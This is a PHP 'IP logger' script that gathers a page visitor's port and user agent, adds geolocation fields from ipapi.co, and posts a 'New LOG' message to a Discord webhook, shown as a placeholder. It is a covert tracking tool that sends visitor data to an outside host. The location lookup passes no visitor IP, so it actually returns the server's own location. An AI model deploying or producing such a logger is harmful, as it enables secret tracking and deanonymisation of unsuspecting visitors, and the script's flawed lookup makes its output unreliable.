<?php
$port = $_SERVER['REMOTE_PORT'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$apiResponse = file_get_contents("https://ipapi.co/json");
$locationData = json_decode($apiResponse);

$ip = $locationData->ip ?? 'N/A';
$org = $locationData->org ?? 'N/A';
$asn = $locationData->asn ?? 'N/A';

$city = $locationData->city ?? 'N/A';
$country_area = $locationData->country_area ?? 'N/A';
$region = $locationData->region ?? 'N/A';
$country = $locationData->country_name ?? 'N/A';
$continent = $locationData->continent_code ?? 'N/A';
$latitude = $locationData->latitude ?? 'N/A';
$longitude = $locationData->longitude ?? 'N/A';
$capital = $locationData->country_capital ?? 'N/A';
$tld = $locationData->country_tld ?? 'N/A';
$timezone = $locationData->timezone ?? 'N/A';

$utc_offset = $locationData->utc_offset ?? 'N/A';
$country_calling_code = $locationData->country_calling_code ?? 'N/A';
$currency_name = $locationData->currency_name ?? 'N/A';
$languages = $locationData->languages ?? 'N/A';
$country_population = $locationData->country_population ?? 'N/A';

$message = "New LOG:\n";
$message .= "IP: " . $ip . "\n";
$message .= "Port: " . $port . "\n\n";

$message .= "ASN: " . $asn . "\n";
$message .= "ORG: " . $org . "\n\n";

$message .= "City: " . $city . "\n";
$message .= "Country area: " . $country_area . "\n";
$message .= "Region: " . $region . "\n";
$message .= "Country: " . $country . "\n";
$message .= "Continent: " . $continent . "\n\n";

$message .= "Latitude: " . $latitude . "\n";
$message .= "Longitude: " . $longitude . "\n\n";

$message .= "Capital : " . $capital . "\n";
$message .= "TLD : " . $tld . "\n";
$message .= "Time zone : " . $timezone . "\n";
$message .= "UTC Offset : " . $utc_offset . "\n";
$message .= "Currency : " . $currency_name . "\n";
$message .= "Languages : " . $languages . "\n";
$message .= "Country calling code : " . $country_calling_code . "\n";
$message .= "Country Population: " . $country_population . "\n\n";

$message .= "User Agent: " . $userAgent . "\n";

$webhookUrl = "YOUR WEBHOOK";
$data = array("content" => $message);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($webhookUrl, false, $context);
if ($result === false) {
    echo "Error sending to Discord webhook.";
} else {
    echo "Message sent successfully.";
}
?>
